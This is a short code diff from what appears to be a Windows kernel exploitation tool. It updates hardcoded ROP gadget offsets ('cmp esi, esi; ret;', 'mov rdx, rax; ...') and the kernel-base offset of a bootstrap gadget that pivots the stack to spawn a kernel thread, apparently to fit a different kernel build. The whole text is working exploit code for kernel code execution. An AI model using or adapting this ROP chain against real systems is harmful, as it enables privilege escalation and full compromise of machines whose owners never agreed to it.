@@ -53,8 +53,8 @@ void RopThreadManager::BuildMainStack(StackManager* Stack, const SharedMemoryDat
     Stack->SetRdx(reinterpret_cast<std::uint64_t>(KernelMemory->KernelSharedMemoryAllocation) + offsetof(SharedMemoryData, WriteSrcAddress));
     Stack->AddGadget(0x21307f, "mov rax, rdx; ret;");
     Stack->ReadRaxIntoRax();
-    Stack->AddGadget(0x3e8aef, "cmp esi, esi; ret;");
-    Stack->AddGadget(0x2cba13, "mov rdx, rax; jne 0x......; add rsp, 0x28; ret;");
+    Stack->AddGadget(0x3e8baf, "cmp esi, esi; ret;");
+    Stack->AddGadget(0x2cbad3, "mov rdx, rax; jne 0x......; add rsp, 0x28; ret;");
     Stack->AddPadding(0x28);
     // perform call
     Stack->AlignStack();
@@ -98,7 +98,7 @@ void RopThreadManager::SendPacket()
 void RopThreadManager::SpawnThread()
 {
     // mov rdx, qword ptr [rcx + 0x50]; mov rbp, qword ptr [rcx + 0x18]; mov rsp, qword ptr [rcx + 0x10]; jmp rdx;
-    void* BootstrapGadget = (void*)(Globals::KernelBase + 0x698bd0);
+    void* BootstrapGadget = (void*)(Globals::KernelBase + 0x6999c0);
 
     HANDLE KernelThreadHandle;
     NTSTATUS ThreadCreationStatus = KernelCaller.Call<NTSTATUS, HANDLE*, ULONG, OBJECT_ATTRIBUTES*, HANDLE, void*, void*, void*>(
